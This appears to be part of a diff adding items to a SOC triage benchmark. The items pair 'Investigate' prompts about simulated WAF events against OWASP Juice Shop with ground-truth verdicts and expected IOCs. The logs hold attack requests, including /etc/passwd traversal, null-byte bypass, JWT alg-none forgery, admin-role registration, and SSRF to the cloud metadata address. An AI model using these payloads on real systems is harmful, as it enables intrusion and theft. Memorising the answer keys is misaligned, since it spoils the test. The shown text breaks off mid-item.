+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /../../../etc/passwd HTTP/1.1 | Status: 200 | Body: <!--   ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.   ~ SPDX-License-Identifier: MIT   -->  <!doctype html> <html lang=\"en\" data-beasties-container> <head>   <meta charset=\"utf-8\">   <title>OWASP Juice Shop</title>   <meta name=\"description\" content=\"Probably the m"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "/etc/passwd"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 28,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /ftp/eastere.gg%2500.md",
+      "siem_event": {
+        "title": "WAF_PathTraversal_easter-egg-null",
+        "source_ip": "10.0.3.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_easter-egg-null",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /ftp/eastere.gg%2500.md HTTP/1.1 | Status: 200 | Body: \"Congratulations, you found the easter egg!\" - The incredibly funny developers  ...  ...  ...  Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:  L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA=="
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "eastere.gg"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 29,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /api-docs",
+      "siem_event": {
+        "title": "WAF_PathTraversal_swagger-exposure",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_swagger-exposure",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /api-docs HTTP/1.1 | Status: 301 | Body: <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"utf-8\"> <title>Redirecting</title> </head> <body> <pre>Redirecting to /api-docs/</pre> </body> </html> "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "/api-docs"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 30,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /encryptionkeys",
+      "siem_event": {
+        "title": "WAF_PathTraversal_encryption-keys",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_encryption-keys",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /encryptionkeys HTTP/1.1 | Status: 200 | Body: <!DOCTYPE html> <html>   <head>     <meta charset='utf-8'>      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />     <title>listing directory /encryptionkeys</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   paddi"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "/encryptionkeys"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 31,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /ftp/acquisitions.md",
+      "siem_event": {
+        "title": "WAF_PathTraversal_ftp-acquisitions",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_ftp-acquisitions",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /ftp/acquisitions.md HTTP/1.1 | Status: 200 | Body: # Planned Acquisitions  > This document is confidential! Do not distribute!  Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph:  Lorem ipsum dolor sit amet, consetetur sadi"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "acquisitions.md"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 32,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /ftp/quarantine",
+      "siem_event": {
+        "title": "WAF_PathTraversal_ftp-quarantine",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_ftp-quarantine",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /ftp/quarantine HTTP/1.1 | Status: 200 | Body: <!DOCTYPE html> <html>   <head>     <meta charset='utf-8'>      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />     <title>listing directory /ftp/quarantine</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   paddi"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "quarantine"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 33,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /.well-known/security.txt",
+      "siem_event": {
+        "title": "WAF_PathTraversal_security-txt",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_security-txt",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /.well-known/security.txt HTTP/1.1 | Status: 200 | Body: Contact: mailto:donotreply@owasp-juice.shop Encryption: https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=19c01cb7157e4645e9e2c863062a85a8cbfbdcda Acknowledgements: /#/score-board Preferred-languages: en, ar, az, bg, bn, ca, cs, da, de, ga, el, es, et, fi, fr, ka, he, hi, hu, id, it, ja, ko, lv"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "security.txt"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 34,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /ftp/suspicious_errors.yml",
+      "siem_event": {
+        "title": "WAF_PathTraversal_ftp-errors",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_ftp-errors",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /ftp/suspicious_errors.yml HTTP/1.1 | Status: 403 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Only .md and .pdf files are allowed!</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient(linear, "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "suspicious_errors.yml"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 35,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /assets/public/images/../../package.json",
+      "siem_event": {
+        "title": "WAF_PathTraversal_dotdot-package",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_dotdot-package",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /assets/public/images/../../package.json HTTP/1.1 | Status: 200 | Body: <!--   ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.   ~ SPDX-License-Identifier: MIT   -->  <!doctype html> <html lang=\"en\" data-beasties-container> <head>   <meta charset=\"utf-8\">   <title>OWASP Juice Shop</title>   <meta name=\"description\" content=\"Probably the m"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "package.json"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 36,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate brute force login attempt 1/5 against admin@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_BruteForce_1",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_BruteForce_1",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 200 | Body: {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "admin123"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 37,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate brute force login attempt 2/5 against admin@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_BruteForce_2",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_BruteForce_2",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "password"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 38,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate brute force login attempt 3/5 against admin@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_BruteForce_3",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_BruteForce_3",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "123456"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 39,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate brute force login attempt 4/5 against admin@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_BruteForce_4",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_BruteForce_4",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "admin"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 40,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate brute force login attempt 5/5 against admin@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_BruteForce_5",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_BruteForce_5",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "letmein"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 41,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate forged JWT token (alg-none) used to access admin panel",
+      "siem_event": {
+        "title": "WAF_JWT_alg-none",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_JWT_alg-none",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /rest/user/whoami HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>TypeError: Cannot read properties of undefined (reading &#39;id&#39;)</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJp..."
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 42,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate forged JWT token (forged-sig) used to access admin panel",
+      "siem_event": {
+        "title": "WAF_JWT_forged-sig",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_JWT_forged-sig",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /rest/user/whoami HTTP/1.1 | Status: 200 | Body: {\"user\":{}}"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 43,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate password reset brute force against admin@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_PasswordReset_admin-reset",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PasswordReset_admin-reset",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /rest/user/reset-password HTTP/1.1 | Status: 401 | Body: Wrong answer to security question."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          65,
+          90
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 44,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate password reset brute force against jim@juice-sh.op",
+      "siem_event": {
+        "title": "WAF_PasswordReset_jim-reset",
+        "source_ip": "10.0.4.21",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PasswordReset_jim-reset",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /rest/user/reset-password HTTP/1.1 | Status: 401 | Body: Wrong answer to security question."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "jim@juice-sh.op"
+        ],
+        "risk_range": [
+          65,
+          90
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 45,
+      "task_type": "brute_force",
+      "severity": "high",
+      "prompt": "Investigate user registration with admin role assignment attempt",
+      "siem_event": {
+        "title": "WAF_RegistrationAbuse_role-escalation",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_RegistrationAbuse_role-escalation",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /api/Users HTTP/1.1 | Status: 201 | Body: {\"status\":\"success\",\"data\":{\"username\":\"\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"id\":23,\"email\":\"evil@attacker.com\",\"role\":\"admin\",\"updatedAt\":\"2026-03-21T14:37:29.080Z\",\"createdAt\":\"2026-03-21T14:37:29.080Z\",\"deleted"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "evil@attacker.com",
+          "role:admin"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 46,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to basket 1",
+      "siem_event": {
+        "title": "WAF_IDOR_Basket_1",
+        "source_ip": "10.0.3.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_Basket_1",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/basket/1 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:1"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 47,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to basket 2",
+      "siem_event": {
+        "title": "WAF_IDOR_Basket_2",
+        "source_ip": "10.0.3.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_Basket_2",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/basket/2 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:2"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 48,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to basket 3",
+      "siem_event": {
+        "title": "WAF_IDOR_Basket_3",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_Basket_3",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/basket/3 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:3"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 49,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to basket 4",
+      "siem_event": {
+        "title": "WAF_IDOR_Basket_4",
+        "source_ip": "10.0.3.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_Basket_4",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/basket/4 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:4"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 50,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to basket 5",
+      "siem_event": {
+        "title": "WAF_IDOR_Basket_5",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_Basket_5",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/basket/5 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:5"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 51,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to user profile 1",
+      "siem_event": {
+        "title": "WAF_IDOR_UserProfile_1",
+        "source_ip": "10.0.3.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_UserProfile_1",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /api/Users/1 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "user_id:1"
+        ],
+        "risk_range": [
+          55,
+          85
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 52,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to user profile 2",
+      "siem_event": {
+        "title": "WAF_IDOR_UserProfile_2",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_UserProfile_2",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /api/Users/2 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "user_id:2"
+        ],
+        "risk_range": [
+          55,
+          85
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 53,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to user profile 3",
+      "siem_event": {
+        "title": "WAF_IDOR_UserProfile_3",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_UserProfile_3",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /api/Users/3 HTTP/1.1 | Status: 401 | Body: <html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "user_id:3"
+        ],
+        "risk_range": [
+          55,
+          85
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 54,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to order history",
+      "siem_event": {
+        "title": "WAF_IDOR_OrderHistory_1",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_OrderHistory_1",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/order-history HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "order_history"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 55,
+      "task_type": "data_exfiltration",
+      "severity": "medium",
+      "prompt": "Investigate IDOR — unauthorized access to order history",
+      "siem_event": {
+        "title": "WAF_IDOR_OrderHistory_2",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_IDOR_OrderHistory_2",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "GET /rest/order-history HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: Blocked illegal activity by ::ffff:172.20.0.1</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "order_history"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 56,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SSRF attempt — profile image URL set to http://localhost:3001/api/Users",
+      "siem_event": {
+        "title": "WAF_SSRF_localhost-users",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SSRF_localhost-users",
+        "timestamp": "2026-03-21T14:37:29Z",
+        "raw_log": "POST /profile/image/url HTTP/1.1 | Status: 302 | Body: Found. Redirecting to /profile"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "localhost",
+          "3001"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "ssrf",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 57,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SSRF attempt — profile image URL set to http://169.254.169.254/latest/meta-data/",
+      "siem_event": {
+        "title": "WAF_SSRF_aws-metadata",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
